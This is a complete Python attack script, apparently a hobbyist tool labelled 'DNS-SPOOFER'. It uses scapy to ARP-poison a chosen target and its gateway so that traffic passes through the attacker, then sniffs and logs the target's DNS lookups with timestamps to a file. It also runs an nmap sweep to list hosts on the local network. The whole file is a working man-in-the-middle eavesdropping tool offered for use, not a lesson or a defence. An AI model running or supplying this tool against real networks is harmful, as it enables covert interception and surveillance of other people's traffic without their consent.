#!/bin/python3

from scapy.all import ARP, sniff, send, packet, DNS
import argparse as ag
import threading as th
import os
import sys
from time import time,ctime 

#-------------------------- functions -----------------------------------------


def colors():
    color = {
    # light colors 
    "red": "\033[0;31m",
    "green": "\033[0;32m",
    "yellow": "\033[0;33m",
    "blue": "\033[0;34m",
    "magenta": "\033[0;35m",
    "cyan": "\033[0;36m",

    # bright colors 
    "bright_red": "\033[0;91m",
    "bright_green": "\033[0;92m",
    "bright_yellow": "\033[0;93m",
    "bright_blue": "\033[0;94m",
    "bright_magenta": "\033[0;95m",
    "bright_cyan": "\033[0;96m",
    }
    return color

def commands():
    parser = ag.ArgumentParser()
    parser.add_argument('-t','--target',dest='target', required = False ,help='Specify the target IP')
    parser.add_argument('-g','--gateway',dest='gateway', required = True ,help='Specify the gateway')
    parser.add_argument('-i','--iface',dest='interface', required = True , help='Specify the interface')
    parser.add_argument('-v','--verbose', dest="verbose", help="Show all DNS", action = 'store_true')
    parser.add_argument('-l', '--ls', dest="listTargets" ,help='List all the target names and IP', action= 'store_true')
    parser.add_argument('-o','--save',dest='save', help="saves all the searched DNS to a file", action = 'store_true' )
    return parser.parse_args()

arguments = commands()
color = colors()

def dnshake(packet):
    ignoreDns = ['connectivitycheck.gstatic.com.','init-p01st.push.apple.com.','apple.com.','time-ios.g.aaplimg.com.','www.icloud.com.','www.apple.com.','push.apple.com.','init.push.apple.com']  
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        dns = packet.getlayer(DNS).qd.qname.decode('utf-8')
        prevDns = ''
        nowtime = ctime(time())
        if arguments.verbose:
            print(f"[*] Target {arguments.target} has searched for {dns} - {nowtime}")
            saveDns(f"{dns} - {nowtime}")
        else:
            if dns not in ignoreDns and dns != prevDns:
                print(f"[*] Target {arguments.target} has searched for {dns} - {nowtime}")
                prevDns = dns
                saveDns(f"{dns} - {nowtime}")
              

def target_spoof():
    t_packet = ARP( pdst = arguments.target , psrc = arguments.gateway )
    while True :
        try:
            send(t_packet , verbose = 0 , inter = 2 , loop = 1 )
        except KeyboardInterrupt:
            print(color['bright_red'] + '[-] Terminating ............')
            sys.exit()

def gw_spoof():
    g_packet = ARP( pdst = arguments.gateway , psrc = arguments.target )
    while True:
        try:
            send(g_packet , verbose = 0 , inter = 2 , loop = 1 )
        except KeyboardInterrupt:
            print(color['bright_red'] + '[-] Terminating ............')
            sys.exit()
            
def getname():
    target = arguments.target
    name = 'Unknown'
    nmap = os.popen(f"nmap -T4 -sn -Pn {target}").read().split('\n')
    nsplit = nmap[1].split()
    if nsplit[-1][1:-1] == target:
        name = nsplit[-2]
    return name
    	

def isArg(arg):
    return color['bright_green'] if arg else color['bright_red']
    

def printer():
    
    vcolor = isArg(arguments.verbose)
    scolor = isArg(arguments.save)

    print(color['bright_blue'] + 
    '''  
                            ______ _   _  _____        ___________ _____  ___________ ___________ 
                            |  _  \ \ | |/  ___|      /  ___| ___ \  _  ||  _  |  ___|  ___| ___ \\
                            | | | |  \| |\ `--. ______\ `--.| |_/ / | | || | | | |_  | |__ | |_/ /
                            | | | | . ` | `--. \______|`--. \  __/| | | || | | |  _| |  __||    / 
                            | |/ /| |\  |/\__/ /      /\__/ / |   \ \_/ /\ \_/ / |   | |___| |\ \ 
                            |___/ \_| \_/\____/       \____/\_|    \___/  \___/\_|   \____/\_| \_|

                                                                                        - jaabir
      
      ''')
    print(color['bright_green'] + f"Target Name : {getname()}")
    print(color['bright_green'] + f"Target IP: {arguments.target}")
    print(color['bright_green'] + f"Gateway : {arguments.gateway}")
    print(color['bright_green'] + f"Interface : {arguments.interface}")
    print(vcolor + f"Verbose : {arguments.verbose}")
    print(scolor + f"Save output : {arguments.save}")
    print(color['bright_blue'] + ''.center(80,'='))


def main():
    # t_thread = []
    # gw_thread = []

    if not arguments.target or not arguments.gateway or not arguments.interface:
        print()
        print(color['bright_yellow'] + "[-] Specify the target IP")
        print(color['bright_yellow'] + "[-] Specify the gateway")
        print(color['bright_yellow'] + "[-] Specify the interface")
        print()
        return 

    printer()
    while True:

        target = th.Thread( target = target_spoof , daemon = True )
        # t_thread.append(target_spoof)
        target.start()

        gwSpoof = th.Thread( target = gw_spoof , daemon = True )
        # gw_thread.append(gw_spoof)
        gwSpoof.start()

        packet = sniff ( iface = arguments.interface , filter = 'udp port 53', prn = dnshake )

def checkUser():
    if os.getuid() != 0 :
        print()
        print(color['bright_red'] + '[-] Run spoofer as root user ......\n[-] Quiting ........\n')
        sys.exit()


def pingScan():
    if arguments.verbose:
        print(color['bright_yellow'] + "[*] It uses ICMP scan to get the live hosts \n[*] if it takes a lot of time, use some other tool to get the target IP")
    scan = os.popen(f'nmap -T4 -sn {arguments.gateway}/24').read().split('\n')
    print('  Available hosts '.center(80,'='))
    for s in scan:
        if '192.168.1.' in s:
            target = s.split()[-2:]
            if target[0] == 'for' : target[0] = 'Unknown'
            res = ' '.join(target)
            print(res)
        


def saveDns(dns):
    if arguments.save:
        with open(f"{arguments.target}.txt", 'a') as file:
            file.write(dns)
            file.write('\n')


#----------------------------------------------------------------------

checkUser()
if not arguments.listTargets:
    try:
        main()
    except KeyboardInterrupt:
        print(color['bright_red'] + '[-] Terminating ............')
        sys.exit()
else:
    pingScan()


